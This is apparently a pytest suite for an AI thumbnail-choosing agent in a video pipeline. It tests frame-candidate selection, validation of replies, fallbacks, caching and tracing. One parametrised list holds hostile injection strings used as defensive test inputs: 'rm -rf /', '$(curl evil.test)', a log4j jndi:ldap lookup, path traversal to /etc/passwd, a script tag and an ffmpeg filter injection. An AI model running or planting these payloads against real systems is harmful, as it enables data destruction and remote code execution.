"""
Thumbnail Agent.

The LLM is injected throughout - no test needs a key or a network - but the
frame grab is REAL: a real ffmpeg pulls a real frame out of a real video, and
ffprobe measures it. The properties most of these defend:

  * the one image operation is master_stage's single-frame grab, read from its
    source, and parity tests fail loudly if that call ever changes
  * every candidate is a frame the delivered video contains - a reference
    trimmed out of the cut, or sitting in a crossfade, is never offered
  * the model answers with an index; it can name no time, clip or path
  * `generated` is never claimed unless the image is on disk and measured
  * packaging runs after the render/critic cycle and never re-enters it
"""

import json
import shutil
import typing
from pathlib import Path

import pytest
from pydantic import ValidationError

from agents.artifacts import (CandidateWindow, ContentStrategy, EditPlan,
                              Hook, InterestingMoment, RenderResult,
                              RenderTechnical, Segment, Story, StoryBeat,
                              Thumbnail, ThumbnailCandidate,
                              ThumbnailOperation, VisionAnalysis, VisionClip)
from agents.thumbnail import (ThumbnailAgent, _engine_ok, _engine_thumbnail,
                              _timeline)
from agents.tools.llm_tools import LLMClient, LLMReply

CALM, LIVELY, UNUSED = "01_calm.mp4", "02_lively.mp4", "03_unused.mp4"
T = 0.4                                   # JobSettings.transition_duration


# ------------------------------------------------------------- helpers

def th_llm(payload, record=None):
    def transport(prompt, max_tokens, images=None):
        if record is not None:
            record.append(prompt)
        text = payload if isinstance(payload, str) else json.dumps(payload)
        return LLMReply(text=text, tokens_in=250, tokens_out=60, usd=0.002)
    return LLMClient(transport=transport)


def failing_llm(error="ConnectionError: refused"):
    def transport(prompt, max_tokens, images=None):
        return LLMReply(text="", error=error)
    return LLMClient(transport=transport)


def a_plan(scores=(2.0, 5.0)):
    """LIVELY 0.5-3.5 then CALM 1.0-4.0: 3s each, so the delivered video is
    3.0 + 3.0 - 0.4 = 5.6s and segment 2 starts at 2.6s."""
    return EditPlan(segments=[
        Segment(index=1, clip_id=LIVELY, start=0.5, end=3.5, duration=3.0,
                score=scores[0], orientation="horizontal"),
        Segment(index=2, clip_id=CALM, start=1.0, end=4.0, duration=3.0,
                score=scores[1], orientation="horizontal")],
        total_duration=5.6, target_seconds=6.0, canvas=(320, 240))


def a_vision(live=True, extra_moments=()):
    def win(i, a, b):
        return CandidateWindow(index=i, start=a, end=b, duration=b - a,
                               mean_ydif=4.0, score=3.0)
    return VisionAnalysis(live=live, clips={
        LIVELY: VisionClip(
            clip_id=LIVELY, summary="a gear train meshing", hook_score=82,
            interesting_moments=[
                InterestingMoment(at=2.0, what="the drive gear engages"),
                InterestingMoment(at=5.5, what="trimmed out of the cut"),
                *extra_moments],
            candidate_windows=[win(0, 1.0, 3.0)], chosen_window=0),
        CALM: VisionClip(
            clip_id=CALM, summary="the finished train turning", hook_score=55,
            interesting_moments=[
                InterestingMoment(at=2.5, what="the whole train turns")],
            candidate_windows=[win(0, 1.0, 2.0)]),
        UNUSED: VisionClip(
            clip_id=UNUSED, summary="a box of parts", hook_score=20,
            interesting_moments=[InterestingMoment(at=1.0, what="parts")],
            candidate_windows=[win(0, 0.0, 2.0)]),
    })


def a_story(hook_moment=0):
    return Story(story_type="reasoned", logline="a gear train, built and run",
                 beats=[StoryBeat(index=1, role="hook", clip_id=LIVELY,
                                  moment_ref=hook_moment,
                                  narrative="the drive gear bites"),
                        StoryBeat(index=2, role="ending", clip_id=CALM,
                                  narrative="the train turns")],
                 insufficient_signal=False, confidence=0.8, live=True)


def a_strategy():
    return ContentStrategy(strategy_type="reasoned",
                           central_topic="a working gear train",
                           audience="builders", hook=Hook(clip_id=LIVELY),
                           insufficient_signal=False, confidence=0.8,
                           live=True)


@pytest.fixture
def video(lively_clip, tmp_path):
    """The 'delivered' video: a real 6s 320x240 h264 file, private to the
    test so one can delete it."""
    dst = tmp_path / "attempt_01.mp4"
    shutil.copy2(lively_clip, dst)
    return dst


def a_render(video, duration=6.0):
    return RenderResult(attempt=1, video_path=str(video),
                        technical=RenderTechnical(duration=duration,
                                                  width=320, height=240,
                                                  size=video.stat().st_size
                                                  if video.exists() else 0))


@pytest.fixture
def th_ctx(director_ctx, tmp_path):
    """A real pool and store, with a PRIVATE build folder so the image and
    any manifest a test writes cannot leak between tests."""
    ctx, _cs = director_ctx
    build = tmp_path / "build"
    build.mkdir()
    ctx.job = ctx.job.model_copy(update={
        "build_dir": str(build),
        "settings": ctx.job.settings.model_copy(
            update={"domain": "model engineering"})})
    return ctx


def run(ctx, tracer_span, video, plan=None, vision="default",
        strategy="default", story="default", verdict="PASS", revision=0,
        render=None):
    agent = ThumbnailAgent()
    with tracer_span(ctx, "thumbnail") as span:
        return agent.execute(
            ctx, span, plan=plan or a_plan(),
            render=render or a_render(video),
            vision=a_vision() if vision == "default" else vision,
            strategy=a_strategy() if strategy == "default" else strategy,
            story=a_story() if story == "default" else story,
            verdict=verdict, revision=revision)


def is_jpeg(path) -> bool:
    return Path(path).read_bytes()[:2] == b"\xff\xd8"


# ------------------------- 1. parity with the real pipeline

def test_the_operation_literal_is_master_stages_only_operation():
    e = _engine_thumbnail()
    assert typing.get_args(ThumbnailOperation) == ("frame_grab",)
    assert _engine_ok(e)
    assert e["file"] == "thumbnail.jpg"


def test_master_stages_thumbnail_call_is_a_bare_single_frame():
    import inspect
    from agents.tools.pipeline_bridge import extras_mod
    src = inspect.getsource(extras_mod.master_stage)
    e = _engine_thumbnail()
    assert e["frame_grab"] and not e["filters"]
    assert '"-frames:v", "1", thumb' in src


def test_why_master_stages_own_frame_never_varies_on_the_agent_path():
    """It takes the highest-SCORE segment, and the agent path projects every
    score as 0.0 - so it is always segment 1. This is the gap being filled;
    if either half changes, this agent's premise needs revisiting."""
    e = _engine_thumbnail()
    assert e["rule_by_score"] and e["scores_projected_zero"]


def test_nothing_in_the_project_generates_an_image():
    root = Path(__file__).resolve().parents[2]
    reqs = (root / "requirements.txt").read_text().lower()
    for lib in ("pillow", "diffusers", "opencv", "imageio", "replicate"):
        assert lib not in reqs, f"{lib} would be an image capability"
    for py in list((root / "server").rglob("*.py")) + \
            list((root / "pipeline").rglob("*.py")):
        src = py.read_text(encoding="utf-8", errors="ignore")
        assert "images/generations" not in src, py


# ------------------------------- 2. every candidate is in the cut

def test_candidates_only_come_from_kept_segments(th_ctx, tracer_span, video):
    p = run(th_ctx, tracer_span, video).payload
    assert {c.clip_id for c in p.candidates} == {LIVELY, CALM}
    assert all(c.segment_index in (1, 2) for c in p.candidates)
    assert UNUSED not in {c.clip_id for c in p.candidates}


def test_a_moment_trimmed_out_of_the_cut_is_not_offered(th_ctx, tracer_span,
                                                        video):
    p = run(th_ctx, tracer_span, video).payload
    assert not any(c.moment_ref == 1 and c.clip_id == LIVELY
                   for c in p.candidates), "5.5s is outside 0.5-3.5"
    # the trimmed moment, plus everything on the clip the cut dropped
    assert p.unrealisable >= 3
    assert any("outside the final cut" in x for x in p.limitations)


def test_a_moment_inside_a_crossfade_is_not_offered(th_ctx, tracer_span,
                                                    video):
    vision = a_vision(extra_moments=[
        InterestingMoment(at=3.3, what="blended into the next clip")])
    p = run(th_ctx, tracer_span, video, vision=vision).payload
    assert not any(c.what == "blended into the next clip"
                   for c in p.candidates)


def test_every_segment_offers_at_least_its_middle(th_ctx, tracer_span,
                                                  video):
    p = run(th_ctx, tracer_span, video, vision=None).payload
    assert [c.source for c in p.candidates] == ["plan_segment"] * 2
    assert [c.clip_at for c in p.candidates] == [2.0, 2.5]


def test_the_same_frame_is_not_offered_twice(th_ctx, tracer_span, video):
    """LIVELY's moment, best window and segment middle are all ~2.0s."""
    p = run(th_ctx, tracer_span, video).payload
    seg1 = [c for c in p.candidates if c.segment_index == 1]
    assert len(seg1) == 1 and seg1[0].source == "vision_moment"


def test_candidate_indices_are_the_contract():
    one = ThumbnailCandidate(index=0, clip_id=CALM, source="plan_segment",
                             segment_index=1, clip_at=1.0, frame_at=1.0)
    with pytest.raises(ValidationError):
        Thumbnail(candidates=[one.model_copy(update={"index": 1})])
    with pytest.raises(ValidationError):
        Thumbnail(candidates=[one, one])


# ----------------------- 3. positions come from the renderer's record

def test_positions_use_the_offsets_the_renderer_recorded(th_ctx, tracer_span,
                                                         video):
    build = Path(th_ctx.job.build_dir)
    (build / "manifest.json").write_text(json.dumps({
        "segments": [{"clip": LIVELY}, {"clip": CALM}],
        "transitions": [2.9]}))
    p = run(th_ctx, tracer_span, video).payload
    c = next(c for c in p.candidates if c.clip_id == CALM
             and c.source == "vision_moment")
    assert c.frame_at == pytest.approx(2.9 + (2.5 - 1.0))
    assert not any("computed from the plan" in x for x in p.limitations)


def test_positions_are_computed_when_the_record_is_not_this_plan(
        th_ctx, tracer_span, video):
    build = Path(th_ctx.job.build_dir)
    (build / "manifest.json").write_text(json.dumps({
        "segments": [{"clip": CALM}, {"clip": LIVELY}],   # a different cut
        "transitions": [9.9]}))
    p = run(th_ctx, tracer_span, video).payload
    c = next(c for c in p.candidates if c.clip_id == CALM
             and c.source == "vision_moment")
    assert c.frame_at == pytest.approx((3.0 - T) + (2.5 - 1.0))
    assert any("computed from the plan" in x for x in p.limitations)


def test_a_retime_is_applied(th_ctx, tracer_span, video):
    (Path(th_ctx.job.build_dir) / "_audio.json").write_text(
        json.dumps({"factor": 2.0}))
    starts, factor, _ = _timeline(th_ctx.job.build_dir, a_plan(), T)
    assert factor == 2.0
    p = run(th_ctx, tracer_span, video).payload
    c = next(c for c in p.candidates if c.clip_id == CALM
             and c.source == "vision_moment")
    assert c.frame_at == pytest.approx(((3.0 - T) + 1.5) / 2.0)


def test_positions_stay_inside_the_delivered_video(th_ctx, tracer_span,
                                                   video):
    p = run(th_ctx, tracer_span, video, render=a_render(video, 3.0)).payload
    assert all(0.1 <= c.frame_at <= 2.9 for c in p.candidates)


# ------------------------------------------ 4. a good reply

def test_a_valid_choice_is_used_and_really_grabbed(th_ctx, tracer_span,
                                                   video):
    th_ctx.llm = th_llm({"choices": [1], "rationale": "the payoff reads"})
    art = run(th_ctx, tracer_span, video)
    p = art.payload
    assert p.live and p.chosen == 1 and p.thumbnail_type == "reasoned"
    assert p.generated
    img = Path(p.image_path)
    assert img.exists() and is_jpeg(img)
    assert img.parent == Path(th_ctx.job.build_dir)
    assert (p.width, p.height) == (320, 240), "a frame, not a crop or resize"
    assert p.size == img.stat().st_size
    assert p.verdict == "PASS" and p.video_path == str(video)
    assert not art.degraded and art.fallback_used is None


def test_the_envelope_is_complete(th_ctx, tracer_span, video):
    th_ctx.llm = th_llm({"choices": [0]})
    art = run(th_ctx, tracer_span, video)
    assert art.kind == "Thumbnail" and art.produced_by == "thumbnail"
    assert art.inputs_hash and art.trace_id and art.decisions
    assert art.cost.tokens_in == 250
    assert th_ctx.store.get(th_ctx.job.job_id, "Thumbnail",
                            Thumbnail) is not None


def test_the_first_valid_choice_wins(th_ctx, tracer_span, video):
    th_ctx.llm = th_llm({"choices": [99, "2", 1, 0]})
    p = run(th_ctx, tracer_span, video).payload
    assert p.chosen == 1
    assert any("not on the list" in x for x in p.limitations)


def test_only_the_three_ranked_choices_are_read(th_ctx, tracer_span, video):
    """The prompt asks for up to three. A fourth is not a ranking anyone
    was asked for, so a reply that spends all three on junk falls back."""
    th_ctx.llm = th_llm({"choices": [99, -1, "2", 1]})
    art = run(th_ctx, tracer_span, video)
    assert not art.payload.live and art.fallback_used


@pytest.mark.parametrize("picks", [[], [99], ["1"], [True], None, {"a": 1},
                                   "first", [-1]])
def test_no_listed_frame_falls_back(th_ctx, tracer_span, video, picks):
    th_ctx.llm = th_llm({"choices": picks})
    art = run(th_ctx, tracer_span, video)
    assert not art.payload.live and art.fallback_used
    assert art.payload.generated, "a fallback still makes a real thumbnail"


def test_a_reply_naming_a_time_clip_or_path_is_ignored(th_ctx, tracer_span,
                                                      video):
    th_ctx.llm = th_llm({"choices": [0], "at": 0.01, "timestamp": "00:00:05",
                         "clip_id": UNUSED, "path": "/etc/passwd"})
    p = run(th_ctx, tracer_span, video).payload
    c = p.choice
    assert c.clip_id != UNUSED and c.frame_at > 0.01
    assert Path(p.image_path).name == "thumbnail_agent_r00.jpg"
    assert any("named a time, clip or path" in x for x in p.limitations)


def test_treatments_are_recorded_and_never_applied(th_ctx, tracer_span,
                                                  video):
    th_ctx.llm = th_llm({"choices": [0], "text": "BIG TITLE",
                         "crop": "tight on the gear", "zoom": "2x",
                         "unsupported_requests": ["a red arrow"]})
    p = run(th_ctx, tracer_span, video).payload
    joined = " ".join(p.unsupported_requests)
    for want in ("BIG TITLE", "tight on the gear", "2x", "a red arrow"):
        assert want in joined
    assert (p.width, p.height) == (320, 240), "nothing was cropped or zoomed"


def test_saying_no_treatment_is_not_a_request(th_ctx, tracer_span, video):
    th_ctx.llm = th_llm({"choices": [0], "text": "none", "crop": "no"})
    assert run(th_ctx, tracer_span, video).payload.unsupported_requests == []


@pytest.mark.parametrize("junk", ["not json", "", "[1,2]", '{"choices": '])
def test_malformed_replies_fall_back(th_ctx, tracer_span, video, junk):
    th_ctx.llm = th_llm(junk)
    art = run(th_ctx, tracer_span, video)
    assert art.fallback_used and not art.payload.live
    assert art.payload.generated


def test_a_failed_call_falls_back(th_ctx, tracer_span, video):
    th_ctx.llm = failing_llm()
    art = run(th_ctx, tracer_span, video)
    assert "unusable" in art.fallback_used


@pytest.mark.parametrize("bad", [5.0, -3, float("nan"), float("inf"), "x",
                                 None])
def test_confidence_is_always_in_range(th_ctx, tracer_span, video, bad):
    th_ctx.llm = th_llm({"choices": [0], "confidence": bad})
    assert 0.0 <= run(th_ctx, tracer_span, video).payload.confidence <= 1.0


def test_no_vision_caps_confidence_and_says_so(th_ctx, tracer_span, video):
    th_ctx.llm = th_llm({"choices": [1], "confidence": 0.95})
    p = run(th_ctx, tracer_span, video, vision=None).payload
    assert p.confidence <= 0.5 and not p.vision_available
    assert any("no semantic reading" in x for x in p.limitations)


def test_lists_are_bounded(th_ctx, tracer_span, video):
    th_ctx.llm = th_llm({"choices": [0], "risks": ["r"] * 50,
                         "limitations": ["l"] * 50,
                         "unsupported_requests": [f"u{i}" for i in range(50)]})
    p = run(th_ctx, tracer_span, video).payload
    assert len(p.risks) <= 8 and len(p.limitations) <= 8
    assert len(p.unsupported_requests) <= 8


MALICIOUS = ["'; rm -rf / #", "$(curl evil.test)", "../../etc/passwd",
             "C:\\Windows\\System32\\cmd.exe", "<script>alert(1)</script>",
             "${jndi:ldap://evil.test/x}", "-vf drawtext=text=pwned"]


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_reply_stays_inert(th_ctx, tracer_span, video, payload):
    th_ctx.llm = th_llm({"choices": [0], "rationale": payload,
                         "risks": [payload], "unsupported_requests": [payload],
                         "text": payload})
    p = run(th_ctx, tracer_span, video).payload
    assert p.generated
    assert Path(p.image_path).name == "thumbnail_agent_r00.jpg"
    assert Path(p.image_path).parent == Path(th_ctx.job.build_dir)
    assert (p.width, p.height) == (320, 240)


def test_the_prompt_offers_indices_not_times(th_ctx, tracer_span, video):
    seen = []
    th_ctx.llm = th_llm({"choices": [0]}, record=seen)
    p = run(th_ctx, tracer_span, video).payload
    prompt = seen[0]
    assert "grabs ONE frame" in prompt
    assert "Choose by `index`" in prompt
    assert "Do NOT give a time" in prompt
    for c in p.candidates:
        assert f"[{c.index}]" in prompt
        assert f"{c.frame_at:.2f}" not in prompt
        assert f"{c.frame_at}s" not in prompt
    assert "a gear train meshing" in prompt         # what Vision saw
    assert "a working gear train" in prompt         # the brief
    assert UNUSED not in prompt


def test_one_candidate_never_calls_the_model(th_ctx, tracer_span, video):
    seen = []
    th_ctx.llm = th_llm({"choices": [0]}, record=seen)
    one = EditPlan(segments=[a_plan().segments[0]], total_duration=3.0,
                   target_seconds=3.0, canvas=(320, 240))
    art = run(th_ctx, tracer_span, video, plan=one, vision=None)
    assert seen == [] and art.payload.generated
    assert "only one frame" in art.fallback_used


# ---------------------------------------- 5. the fallback, deterministic

def test_with_no_model_the_story_hook_moment_is_used(th_ctx, tracer_span,
                                                     video):
    th_ctx.llm = LLMClient()
    art = run(th_ctx, tracer_span, video)
    c = art.payload.choice
    assert (c.source, c.clip_id, c.moment_ref) == ("vision_moment", LIVELY, 0)
    assert art.payload.generated and not art.payload.live
    assert art.degraded and "deterministic thumbnail" in art.fallback_used


def test_without_a_hook_moment_the_strongest_segment_is_used(th_ctx,
                                                             tracer_span,
                                                             video):
    th_ctx.llm = LLMClient()
    p = run(th_ctx, tracer_span, video, story=None).payload
    assert p.choice.segment_index == 2, "score 5.0 beats 2.0"
    assert "strongest planned segment" in p.rationale


def test_the_fallback_follows_the_scores_not_the_order(th_ctx, tracer_span,
                                                       video):
    th_ctx.llm = LLMClient()
    p = run(th_ctx, tracer_span, video, story=None,
            plan=a_plan(scores=(9.0, 1.0))).payload
    assert p.choice.segment_index == 1


def test_a_hook_moment_outside_the_cut_is_not_forced(th_ctx, tracer_span,
                                                     video):
    th_ctx.llm = LLMClient()
    p = run(th_ctx, tracer_span, video, story=a_story(hook_moment=1)).payload
    assert p.choice.segment_index == 2      # the strongest segment instead


def test_the_fallback_attributes_nothing_to_an_llm(th_ctx, tracer_span,
                                                   video):
    th_ctx.llm = LLMClient()
    art = run(th_ctx, tracer_span, video)
    assert all(d.decided_by != "llm" for d in art.decisions)
    assert any(d.decided_by == "fallback" for d in art.decisions)


# ------------------------- 6. nothing claimed that did not happen

def test_a_missing_video_is_reported_not_generated(th_ctx, tracer_span,
                                                   video):
    render = a_render(video)
    video.unlink()
    art = run(th_ctx, tracer_span, video, render=render)
    p = art.payload
    assert not p.generated and p.image_path is None
    assert p.width is None and p.size == 0
    assert any("no image was generated" in x for x in p.limitations)
    d = next(d for d in art.decisions if d.what == "Thumbnail image")
    assert d.chose == "not generated" and d.decided_by == "measurement"
    assert art.degraded


def test_a_failed_grab_leaves_no_file_and_claims_nothing(th_ctx, tracer_span,
                                                         video, monkeypatch):
    monkeypatch.setattr(th_ctx.pool, "run_process",
                        lambda cmd, **kw: (1, "ffmpeg: boom"))
    p = run(th_ctx, tracer_span, video).payload
    assert not p.generated and p.image_path is None
    assert not list(Path(th_ctx.job.build_dir).glob("thumbnail_agent_*"))


def test_an_unreadable_image_is_not_claimed(th_ctx, tracer_span, video,
                                            monkeypatch):
    def fake(cmd, **kw):
        Path(cmd[-1]).write_bytes(b"this is not a jpeg at all")
        return 0, ""
    monkeypatch.setattr(th_ctx.pool, "run_process", fake)
    p = run(th_ctx, tracer_span, video).payload
    assert not p.generated
    assert not Path(th_ctx.job.build_dir, "thumbnail_agent_r00.jpg").exists()


def test_an_old_image_is_never_mistaken_for_a_new_one(th_ctx, tracer_span,
                                                      video, monkeypatch):
    stale = Path(th_ctx.job.build_dir) / "thumbnail_agent_r00.jpg"
    stale.write_bytes(b"\xff\xd8 an old image from some earlier run")
    monkeypatch.setattr(th_ctx.pool, "run_process",
                        lambda cmd, **kw: (1, "failed"))
    p = run(th_ctx, tracer_span, video).payload
    assert not p.generated and not stale.exists()


def test_the_schema_refuses_a_claim_without_an_image():
    cand = ThumbnailCandidate(index=0, clip_id=CALM, source="plan_segment",
                              segment_index=1, clip_at=1.0, frame_at=1.0)
    with pytest.raises(ValidationError):
        Thumbnail(candidates=[cand], chosen=0, generated=True)
    with pytest.raises(ValidationError):
        Thumbnail(candidates=[cand], chosen=0, image_path="x.jpg")
    with pytest.raises(ValidationError):
        Thumbnail(candidates=[cand], chosen=0, width=320, height=240)
    with pytest.raises(ValidationError):
        Thumbnail(candidates=[cand], chosen=1)
    ok = Thumbnail(candidates=[cand], chosen=0, generated=True,
                   image_path="x.jpg", width=320, height=240, size=10)
    assert ok.choice is cand or ok.choice == cand


@pytest.mark.parametrize("field,value", [
    ("text", "BIG TITLE"), ("overlay", "logo"), ("prompt", "a dragon"),
    ("crop", [0, 0, 10, 10]), ("operation", "generate"),
    ("operation", "crop"), ("thumbnail_type", "ai_generated")])
def test_the_schema_has_no_way_to_express_other_operations(field, value):
    with pytest.raises(ValidationError):
        Thumbnail(**{field: value})


@pytest.mark.parametrize("field", ["path", "start", "duration", "filter",
                                   "ffmpeg", "timestamp"])
def test_a_candidate_cannot_carry_a_path_or_a_filter(field):
    with pytest.raises(ValidationError):
        ThumbnailCandidate(index=0, clip_id=CALM, source="plan_segment",
                           segment_index=1, clip_at=1.0, frame_at=1.0,
                           **{field: 1})


def test_only_known_sources_validate():
    with pytest.raises(ValidationError):
        ThumbnailCandidate(index=0, clip_id=CALM, source="model_says_so",
                           segment_index=1, clip_at=1.0, frame_at=1.0)


# ---------------------------------------------------- 7. processes

def test_no_process_outlives_the_grab(th_ctx, tracer_span, video):
    th_ctx.llm = th_llm({"choices": [0]})
    p = run(th_ctx, tracer_span, video).payload
    assert p.generated
    assert th_ctx.pool.active_processes(th_ctx.job.job_id) == []


def test_the_grab_is_owned_by_the_pool(th_ctx, tracer_span, video,
                                       monkeypatch):
    seen = {}
    real = th_ctx.pool.run_process

    def spy(cmd, **kw):
        seen.update(kw, cmd=cmd)
        return real(cmd, **kw)
    monkeypatch.setattr(th_ctx.pool, "run_process", spy)
    run(th_ctx, tracer_span, video)
    assert seen["label"] == "thumbnail:frame_grab"
    assert seen["job_id"] == th_ctx.job.job_id and seen["timeout_s"]
    assert seen["cmd"][seen["cmd"].index("-frames:v") + 1] == "1"
    assert "-vf" not in seen["cmd"] and "-filter_complex" not in seen["cmd"]


# ------------------------------------------------------- 8. caching

def test_identical_inputs_hit_the_cache_without_regrabbing(
        th_ctx, tracer_span, video, monkeypatch):
    th_ctx.llm = th_llm({"choices": [1]})
    a = run(th_ctx, tracer_span, video)
    calls = []
    monkeypatch.setattr(th_ctx.pool, "run_process",
                        lambda cmd, **kw: calls.append(cmd) or (1, ""))
    b = run(th_ctx, tracer_span, video, revision=1)
    assert a.artifact_id == b.artifact_id and calls == []


def test_a_cached_thumbnail_whose_image_is_gone_is_remade(th_ctx,
                                                          tracer_span,
                                                          video):
    th_ctx.llm = th_llm({"choices": [1]})
    a = run(th_ctx, tracer_span, video)
    Path(a.payload.image_path).unlink()
    b = run(th_ctx, tracer_span, video, revision=1)
    assert b.artifact_id != a.artifact_id
    assert b.payload.generated and Path(b.payload.image_path).exists()


@pytest.mark.parametrize("change", ["plan", "vision", "story", "verdict"])
def test_the_cache_invalidates_when_an_input_changes(th_ctx, tracer_span,
                                                     video, change):
    th_ctx.llm = th_llm({"choices": [0]})
    a = run(th_ctx, tracer_span, video)
    kw = {"plan": {"plan": a_plan(scores=(9.0, 1.0))},
          "vision": {"vision": a_vision(extra_moments=[
              InterestingMoment(at=1.5, what="new")])},
          "story": {"story": a_story(hook_moment=None)},
          "verdict": {"verdict": "ESCALATE"}}[change]
    b = run(th_ctx, tracer_span, video, revision=1, **kw)
    assert a.inputs_hash != b.inputs_hash


def test_the_cache_invalidates_when_the_delivered_video_changes(
        th_ctx, tracer_span, video, tmp_path):
    th_ctx.llm = th_llm({"choices": [0]})
    a = run(th_ctx, tracer_span, video)
    other = tmp_path / "attempt_02.mp4"
    shutil.copy2(video, other)
    b = run(th_ctx, tracer_span, other, revision=1)
    assert a.inputs_hash != b.inputs_hash
    assert b.payload.video_path == str(other)


# ------------------------------------------- 9. trace and decisions

def test_the_trace_records_the_call_and_the_grab(th_ctx, tracer_span, video):
    th_ctx.llm = th_llm({"choices": [0]})
    with tracer_span(th_ctx, "thumbnail") as span:
        art = ThumbnailAgent().execute(
            th_ctx, span, plan=a_plan(), render=a_render(video),
            vision=a_vision(), strategy=a_strategy(), story=a_story())
        assert art.trace_id == span.trace_id
    rows = [r for r in th_ctx.tracer.for_job(th_ctx.job.job_id)
            if r["node"] == "thumbnail"]
    tools = [t["tool"] for r in rows for t in r["tool_calls"]]
    assert "llm.complete_json" in tools
    assert "thumbnail.frame_grab" in tools
    assert "verify.probe_image" in tools
    assert art.artifact_id in rows[-1]["output_artifacts"]
    assert rows[-1]["tokens_in"] == 250


def test_the_fallback_is_recorded_in_the_trace(th_ctx, tracer_span, video):
    th_ctx.llm = LLMClient()
    run(th_ctx, tracer_span, video)
    rows = [r for r in th_ctx.tracer.for_job(th_ctx.job.job_id)
            if r["node"] == "thumbnail"]
    assert "deterministic thumbnail" in rows[-1]["fallback_used"]


def test_decisions_use_the_existing_closed_enum(th_ctx, tracer_span, video):
    from agents.artifacts import DecidedBy
    th_ctx.llm = th_llm({"choices": [0], "text": "TITLE"})
    art = run(th_ctx, tracer_span, video)
    assert {d.decided_by for d in art.decisions} <= set(
        typing.get_args(DecidedBy))
    by = {d.what: d for d in art.decisions}
    assert by["Thumbnail frame"].decided_by == "llm"
    assert by["Thumbnail image"].decided_by == "measurement"
    assert "thumbnail_agent_r00.jpg 320x240" in by["Thumbnail image"].chose
    assert by["What the pipeline can make"].decided_by == "measurement"
    assert by["What master_stage shows on its own"].chose == \
        "the middle of segment 1, every time"
    assert "Asked for but not possible" in by


# ------------------------------------------- 10. packaging into the app

def _thumb_for(video, image, generated=True):
    cand = ThumbnailCandidate(index=0, clip_id=CALM, source="plan_segment",
                              segment_index=1, clip_at=1.0, frame_at=1.0)
    if not generated:
        return Thumbnail(candidates=[cand], chosen=0, video_path=str(video))
    return Thumbnail(candidates=[cand], chosen=0, video_path=str(video),
                     generated=True, image_path=str(image), width=320,
                     height=240, size=10)


def test_packaging_publishes_the_agents_image_of_this_render(tmp_path,
                                                            video):
    from agents.compat import _packaged_thumbnail
    build = tmp_path / "build"
    build.mkdir(exist_ok=True)
    img = build / "thumbnail_agent_r00.jpg"
    img.write_bytes(b"\xff\xd8")
    render = a_render(video)
    assert _packaged_thumbnail(build, render, _thumb_for(video, img)) == \
        "thumbnail_agent_r00.jpg"


def test_packaging_keeps_master_stages_thumbnail_otherwise(tmp_path, video):
    from agents.compat import _packaged_thumbnail
    build = tmp_path / "build"
    build.mkdir(exist_ok=True)
    img = build / "thumbnail_agent_r00.jpg"
    img.write_bytes(b"\xff\xd8")
    render = a_render(video)
    other = tmp_path / "elsewhere.jpg"
    other.write_bytes(b"\xff\xd8")
    assert _packaged_thumbnail(build, render, None) is None
    assert _packaged_thumbnail(build, render,
                               _thumb_for(video, img, False)) is None
    # a frame of a different attempt
    assert _packaged_thumbnail(build, render,
                               _thumb_for(tmp_path / "x.mp4", img)) is None
    # outside this build folder
    assert _packaged_thumbnail(build, render,
                               _thumb_for(video, other)) is None
    # deleted since
    img.unlink()
    assert _packaged_thumbnail(build, render,
                               _thumb_for(video, img)) is None
